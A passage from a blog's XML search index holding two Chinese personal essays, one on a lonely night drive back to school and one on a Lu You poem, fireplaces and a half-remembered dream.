驱车返校的路比来时更加冷清，我在荒凉里逆行，在繁华里逆行，所以才显得与这个世界格格不入。我看到了更多的东西，灯火零星的路边，相拥取暖的恋人，烂醉如泥的男人，手里购物袋装着满满喜悦的女人。世界热闹起来了，寒冷赐予我的锋芒终于刺进了温热的棉花糖里，在狂欢的泥潭里慢慢融化。与这座城市上空所有无疾而终的水汽一起，成了凝华在我心窗上不化的雾凇。 2018.11.19 夜]]></content>
  </entry>
  <entry>
    <title><![CDATA[壁炉与梦境]]></title>
    <url>%2F2018%2F10%2F31%2F%E5%A3%81%E7%82%89%E4%B8%8E%E6%A2%A6%E5%A2%83%2F</url>
    <content type="text"><![CDATA[我合上电脑，已是凌晨两点。 数不清这是两周来多少次熬到夜深，但对于一个迟睡的人最大的幸运莫过于次日早晨无事，不必早起。 我是一个不能早起的人，是一个把自然醒奉为圭臬的人。 不知觉里翻身惊破了我的梦，看了看时间已是9点。 惺忪里消去一夜里手机产生的红点，看见一个app推送了这么一句诗词: 风卷江湖雨暗村，四山声作海涛翻。溪柴火软蛮毡暖，我与狸奴不出门。 大概意思就是外面风雨大作，我在家里什么都不做，围着火炉盖着小被子撸猫。 不禁艳羡起古人来，江南的油纸伞势必禁不住狂风骤雨的洗礼，所以从政的不用舟车劳顿四处转徙，商人可以在自家门前挂上一块今日无事的牌匾，若是在隆冬，壁炉就成了所有人共同的精神介质。 壁炉绝对是一个跨越了国界交融了文化的神奇之物。我向来不太爱听欧美的流行歌曲，总觉得是单纯的喧闹，又不如西方摇滚喧闹得有血有肉。但《safe&amp;sound》和其mv着实让我感觉惊艳美好，大概也是因为其中的壁炉。不管外面怎样荒凉，炉火与吉他声都温暖了整个木屋。 这时候又想起我惊破的那个梦来，大概是我遇到了一位很早的故友，我跟着她在都市的夜色下狂奔，她是如此地快速以至于我不能望其项背，最终在霓虹的末端不见了她的身影。 不太清楚梦的寓意，大概于我的壁炉，又是另外一种人生选择。 好奇心驱使下在百度上搜索了这个诗句，发现是放翁的《十一月四日风雨大作》其一。其二是”夜阑卧听风吹雨”，”两作都表达了作者报国无门的忧愤心情”。 我好长时间没说出话来。 10月31日 晨]]></content>
  </entry>
</search>
